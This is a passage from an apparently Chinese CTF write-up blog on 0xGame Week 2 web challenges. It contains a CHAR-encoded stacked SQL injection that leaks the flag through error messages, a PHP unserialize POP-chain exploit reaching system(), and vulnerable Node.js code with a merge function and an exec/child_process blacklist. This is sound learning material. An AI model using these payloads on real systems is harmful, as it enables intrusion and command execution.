class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br><br></code></pre></td></tr></table></figure><p><code>SET @a=CHAR(115,101,108,101,99,116,32,101,120,116,114,97,99,116,118,97,108,117,101,40,49,44,99,111,110,99,97,116,40,48,120,55,101,44,40,115,101,108,101,99,116,32,102,108,97,103,32,102,114,111,109,32,102,108,97,103,32,108,105,109,105,116,32,48,44,49,41,41,41,59);PREPARE/**/hello/**/FROM/**/@a;EXECUTE/**/hello;</code></p><p><img src="/img/sqli1.png" alt="sqli1"></p><p>返回：<code>XPATH syntax error: &#39;~0xGame&#123;4286b62d-c37e-4010-ba9c-&#39;&quot;)</code>,没显示完全，好像因为报错函数只能显示32位？改下<code>payload</code>让它显示<code>flag</code>的后30位：<code>flag</code>-&gt;<code>(right(flag,30))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?<span class="hljs-keyword">order</span><span class="hljs-operator">=</span>email;<span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">40</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">103</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">44</span>,<span class="hljs-number">51</span>,<span class="hljs-number">48</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<span class="hljs-keyword">PREPARE</span><span class="hljs-comment">/**/</span>hello<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-comment">/**/</span>hello;<br></code></pre></td></tr></table></figure><p><img src="/img/sqli2.png" alt="sqli2"></p><p>拼起来得到<code>flag</code>:<code>0xGame&#123;4286b62d-c37e-4010-ba9c-35d47641fb91&#125;</code></p><h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><p>这题没做出来挺可惜的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//强行把expired设置False，之前碰到都是利用修改属性个数绕过，但师傅提示需通过引用绕过</span><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123; <span class="hljs-comment">//如果expired为True</span><br>            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);<span class="hljs-comment">//clean?好像是一个不存在的方法，通过这个调用__call</span><br>            <span class="hljs-keyword">return</span> True; <span class="hljs-comment">//返回True</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<span class="hljs-comment">//将一个空数组赋值给store</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<span class="hljs-comment">//给不可访问属性赋值时被调用</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) <br>            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;<span class="hljs-comment">//system函数</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123; <span class="hljs-comment">//链子的尾，通过这个执行命令</span><br>        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);  <span class="hljs-comment">//system(&#x27;ls&#x27;)等？</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//链子的头</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<span class="hljs-comment">//遍历data数组，键key值value</span><br>            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<span class="hljs-comment">//将storage对象的$key属性赋值为$value,注意此时可以去触发Storage的__set方法.(给不可访问的属性赋值)</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<span class="hljs-comment">//反序列化</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$c</span> -&gt; expired = False;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br>    <span class="hljs-variable">$a</span>-&gt; data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$d</span>);<span class="hljs-comment">//放入Cache1和Cache2，两个实例</span><br>    <span class="hljs-variable">$a</span>-&gt; storage = <span class="hljs-variable">$b</span>; <span class="hljs-comment">//这里触发了Storage中的__set方法</span><br>    <span class="hljs-variable">$b</span>-&gt; store = &amp;<span class="hljs-variable">$d</span>-&gt;expired;<span class="hljs-comment">//通过引用赋值绕过__wakeup，store和$d指向相同的内存地址</span><br>    <span class="hljs-variable">$d</span> -&gt; key = <span class="hljs-string">&#x27;id&#x27;</span>;<br>    <span class="hljs-variable">$d</span>-&gt; helper = <span class="hljs-variable">$e</span>;<br>    <span class="hljs-variable">$e</span>-&gt; <span class="hljs-variable">$funcs</span> = [<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><br>DataObject.__destruct<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Storage.__set<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Cache.expired<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Helper.__call()<br><br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考文章:ttps:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">377676274</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">pear:</span><br><span class="hljs-symbol">https:</span>//longlone.top/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%B6</span>/register_argc_argv<span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%8</span>Einclude<span class="hljs-variable">%20</span><span class="hljs-keyword">to</span><span class="hljs-variable">%20</span>RCE<span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%99</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span>/<br><span class="hljs-symbol">https:</span>//blog.csdn.net/RABCDXB/article/details/<span class="hljs-number">122050370</span><br><br></code></pre></td></tr></table></figure><h3 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h3><p><code>app.js</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span><br>&#125;))<br><br><span class="hljs-keyword">var</span> users = &#123;&#125;<br><span class="hljs-keyword">var</span> admins = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123; <span class="hljs-comment">//merge，原型链污染</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<span class="hljs-comment">//这里过滤了__protp__</span><br>            <span class="hljs-keyword">continue</span><span class="hljs-comment">//中断迭代，进入下一次循环</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123; <span class="hljs-comment">//同上</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;<br>        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]<br>    &#125;<br>    <span class="hljs-title 